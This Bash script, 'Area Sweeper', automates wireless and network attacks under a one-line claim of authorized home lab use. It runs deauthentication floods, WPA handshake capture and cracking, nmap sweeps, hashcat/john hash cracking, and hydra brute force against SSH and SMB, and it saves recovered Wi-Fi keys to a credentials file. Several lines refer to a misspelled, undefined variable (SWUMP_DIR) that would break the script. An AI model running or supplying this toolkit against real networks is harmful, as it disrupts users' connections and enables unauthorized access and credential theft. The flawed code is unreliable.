#!/bin/bash
# ====================================================================
# AREA SWEEPER - Automatic Network Profiling & Security Assessment
# Auto-discovers, sniffs, captures handshakes, and cracks passwords
# For authorized home lab testing only
# ====================================================================

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
KALI_SHARE="${SCRIPT_DIR}/.."
SWEEP_DIR="${KALI_SHARE}/sweeps/$(date +%Y%m%d_%H%M%S)"
WORDLIST="/usr/share/wordlists/rockyou.txt"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

log() { echo -e "${GREEN}[*]${NC} $1"; }
warn() { echo -e "${YELLOW}[!]${NC} $1"; }
error() { echo -e "${RED}[X]${NC} $1"; exit 1; }

check_root() {
    [[ $EUID -ne 0 ]] && error "Run as root"
}

init_sweep() {
    check_root
    mkdir -p "$SWEEP_DIR"
    
    log "Initializing Area Sweep..."
    log "Output directory: $SWEEP_DIR"
    
    echo "=== Area Sweep $(date) ===" > "${SWEEP_DIR}/sweep.log"
}

discover_wifi() {
    log "=== PHASE 1: WiFi Discovery ==="
    
    local iface="${1:-wlan0}"
    
    airmon-ng start "$iface" >/dev/null 2>&1
    sleep 2
    
    log "Scanning for WiFi networks..."
    timeout 30 airodump-ng wlan0mon -w "${SWEEP_DIR}/wifi_scan" --encrypt a > "${SWEEP_DIR}/wifi.log" 2>&1 &
    PID=$!
    
    sleep 25
    
    if kill -0 $PID 2>/dev/null; then
        kill $PID 2>/dev/null
    fi
    
    airmon-ng stop wlan0mon >/dev/null 2>&1
    
    log "WiFi discovery complete"
    echo "WIFI_SCAN_COMPLETE=$(date)" >> "${SWEEP_DIR}/sweep.log"
}

capture_handshakes() {
    log "=== PHASE 2: Handshake Capture ==="
    
    local bssid="$1"
    local channel="$2"
    local duration="${3:-120}"
    
    if [[ -z "$bssid" ]]; then
        log "No BSSID provided, capturing all handshakes..."
        
        airmon-ng start wlan0 >/dev/null 2>&1
        timeout "$duration" airodump-ng wlan0mon -w "${SWEEP_DIR}/handshake" --beacon -d 2>&1 | \
            grep -E "WPA|WPA2|handshake" >> "${SWEEP_DIR}/handshakes.log" &
        PID=$!
        
        log "Capturing handshakes for ${duration}s..."
        sleep "$duration"
        
        if kill -0 $PID 2>/dev/null; then
            kill $PID 2>/dev/null
        fi
        
        airmon-ng stop wlan0mon >/dev/null 2>&1
    else
        log "Targeting BSSID: $bssid on channel $channel"
        
        airmon-ng start wlan0 >/dev/null 2>&1
        airodump-ng --bssid "$bssid" -c "$channel" -w "${SWEEP_DIR}/handshake" wlan0mon >/dev/null 2>&1 &
        DUMP_PID=$!
        
        sleep 5
        
        log "Sending deauth packets..."
        aireplay-ng --deauth 50 -a "$bssid" wlan0mon >/dev/null 2>&1 &
        
        sleep "$duration"
        
        kill $DUMP_PID 2>/dev/null
        airmon-ng stop wlan0mon >/dev/null 2>&1
    fi
    
    log "Handshake capture complete"
    echo "HANDSHAKE_CAPTURE_COMPLETE=$(date)" >> "${SWEEP_DIR}/sweep.log"
}

deauth_clients() {
    log "=== PHASE 2b: Client Deauth ==="
    
    local bssid="$1"
    
    airmon-ng start wlan0 >/dev/null 2>&1
    
    timeout 60 aireplay-ng --deauth 100 -a "$bssid" wlan0mon 2>&1 | \
        tee "${SWEEP_DIR}/deauth.log"
    
    airmon-ng stop wlan0mon >/dev/null 2>&1
    
    log "Deauth complete"
}

crack_wifi() {
    log "=== PHASE 3: WiFi Cracking ==="
    
    local handshake_file="$1"
    local wordlist="${2:-$WORDLIST}"
    
    if [[ -z "$handshake_file" ]]; then
        handshake_file=$(ls -t "${SWEEP_DIR}"/*.cap 2>/dev/null | head -1)
    fi
    
    if [[ -z "$handshake_file" ]] || [[ ! -f "$handshake_file" ]]; then
        warn "No handshake file found"
        return
    fi
    
    log "Cracking: $handshake_file"
    
    aircrack-ng -w "$wordlist" "$handshake_file" 2>&1 | tee "${SWEEP_DIR}/crack.log"
    
    if grep -q "KEY FOUND" "${SWEEP_DIR}/crack.log"; then
        local password=$(grep "KEY FOUND" "${SWEEP_DIR}/crack.log" | awk '{print $4}')
        log "PASSWORD FOUND: $password"
        echo "WIFI_PASSWORD=$password $(date)" >> "${SWEEP_DIR}/credentials.txt"
    else
        warn "Password not found with current wordlist"
    fi
    
    echo "WIFI_CRACK_COMPLETE=$(date)" >> "${SWEEP_DIR}/sweep.log"
}

scan_network() {
    log "=== PHASE 4: Network Scanning ==="
    
    local subnet="$1"
    
    if [[ -z "$subnet" ]]; then
        subnet="192.168.1.0/24"
    fi
    
    log "Scanning: $subnet"
    
    nmap -sn "$subnet" -oX "${SWEEP_DIR}/nmap_scan.xml" 2>/dev/null
    
    nmap -sV -p- -T4 "$subnet" -oA "${SWEEP_DIR}/nmap_full" 2>/dev/null
    
    echo "NETWORK_SCAN_COMPLETE=$(date)" >> "${SWEEP_DIR}/sweep.log"
    
    log "Network scan complete"
}

scan_services() {
    log "=== PHASE 5: Service Enumeration ==="
    
    local target="$1"
    
    if [[ -z "$target" ]]; then
        warn "No target specified"
        return
    fi
    
    log "Scanning services on $target"
    
    nmap -sV -sC -p 21,22,23,25,53,80,110,139,143,443,445,993,995,3306,3389,5432,8080,8443 "$target" \
        -oA "${SWEEP_DIR}/service_scan_${target}" 2>/dev/null
    
    echo "SERVICE_SCAN_COMPLETE=$target $(date)" >> "${SWEEP_DIR}/sweep.log"
}

crack_passwords() {
    log "=== PHASE 6: Password Cracking ==="
    
    local hash_file="$1"
    local wordlist="${2:-$WORDLIST}"
    
    if [[ -z "$hash_file" ]] || [[ ! -f "$hash_file" ]]; then
        warn "No hash file provided"
        return
    fi
    
    log "Cracking passwords..."
    
    if command -v hashcat &> /dev/null; then
        hashcat -m 0 "$hash_file" "$wordlist" --show > "${SWEEP_DIR}/cracked.txt" 2>/dev/null
    fi
    
    if command -v john &> /dev/null; then
        john --wordlist="$wordlist" "$hash_file" --format=raw-md5 > "${SWUMP_DIR}/john_output.txt" 2>/dev/null
    fi
    
    log "Password crack complete"
}

grab_creds() {
    log "=== PHASE 7: Credential Harvesting ==="
    
    local target="$1"
    
    if [[ -z "$target" ]]; then
        warn "No target specified"
        return
    fi
    
    log "Attempting credential grab on $target"
    
    if command -v hydra &> /dev/null; then
        hydra -L /usr/share/wordlists/usernames.txt -P "$WORDLIST" \
            -s 22 "$target" ssh -t 4 2>&1 | tee "${SWEEP_DIR}/hydra_ssh.log"
        
        hydra -L /usr/share/wordlists/usernames.txt -P "$WORDLIST" \
            -s 445 "$target" smb 2>&1 | tee "${SWUMP_DIR}/hydra_smb.log"
    fi
    
    echo "CRED_GRAB_COMPLETE=$(date)" >> "${SWEEP_DIR}/sweep.log"
}

auto_sweep() {
    log "=== AUTO SWEEP MODE ==="
    
    init_sweep
    
    log "Phase 1: WiFi Discovery"
    discover_wifi
    
    log "Phase 2: Handshake Capture (60s)"
    capture_handshakes "" 60
    
    log "Phase 3: Network Scan"
    scan_network
    
    log "=== SWEEP COMPLETE ==="
    log "Results in: $SWEEP_DIR"
    
    ls -la "$SWEEP_DIR"
}

full_sweep() {
    local target="$1"
    
    init_sweep
    
    discover_wifi
    capture_handshakes "" 120
    scan_network
    scan_services "$target"
    
    log "Full sweep complete"
}

show_menu() {
    echo -e "${CYAN}╔══════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║          AREA SWEEPER v1.0                         ║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo "  ${GREEN}1)${NC} Auto Sweep           (WiFi + Network)"
    echo "  ${GREEN}2)${NC} WiFi Discovery       (Scan networks)"
    echo "  ${GREEN}3)${NC} Capture Handshakes  (Deauth + capture)"
    echo "  ${GREEN}4)${NC} Crack WiFi           (Aircrack/Hashcat)"
    echo "  ${GREEN}5)${NC} Network Scan         (Nmap discovery)"
    echo "  ${GREEN}6)${NC} Service Scan         (Port enumeration)"
    echo "  ${GREEN}7)${NC} Crack Hashes         (Password attack)"
    echo "  ${GREEN}8)${NC} Grab Credentials     (Hydra brute)"
    echo "  ${GREEN}9)${NC} Full Sweep           (Everything)"
    echo "  ${GREEN}0)${NC} View Sweep Results"
    echo ""
    echo -e "  ${RED}q/Q)${NC} Quit"
    echo ""
}

main() {
    check_root
    
    while true; do
        show_menu
        read -p "Select option: " choice
        
        case $choice in
            1) auto_sweep ;;
            2) 
                read -p "Interface [wlan0]: " iface
                discover_wifi "${iface:-wlan0}"
                ;;
            3)
                read -p "BSSID (optional): " bssid
                read -p "Channel (optional): " channel
                read -p "Duration [60s]: " dur
                capture_handshakes "$bssid" "${channel:-1}" "${dur:-60}"
                ;;
            4)
                read -p "Handshake file: " hf
                read -p "Wordlist: " wl
                crack_wifi "$hf" "${wl:-$WORDLIST}"
                ;;
            5)
                read -p "Subnet [192.168.1.0/24]: " subnet
                scan_network "${subnet:-192.168.1.0/24}"
                ;;
            6)
                read -p "Target IP: " target
                scan_services "$target"
                ;;
            7)
                read -p "Hash file: " hf
                read -p "Wordlist: " wl
                crack_passwords "$hf" "${wl:-$WORDLIST}"
                ;;
            8)
                read -p "Target IP: " target
                grab_creds "$target"
                ;;
            9)
                read -p "Target IP (optional): " target
                full_sweep "$target"
                ;;
            0)
                ls -la "${SWEEP_DIR:-/root/KaliShare/sweeps/$(date +%Y%m%d)/}" 2>/dev/null || log "No sweeps yet"
                ;;
            q|Q) log "Goodbye!"; exit 0 ;;
            *) warn "Invalid option" ;;
        esac
        echo ""
        read -p "Press Enter to continue..."
    done
}

main "$@"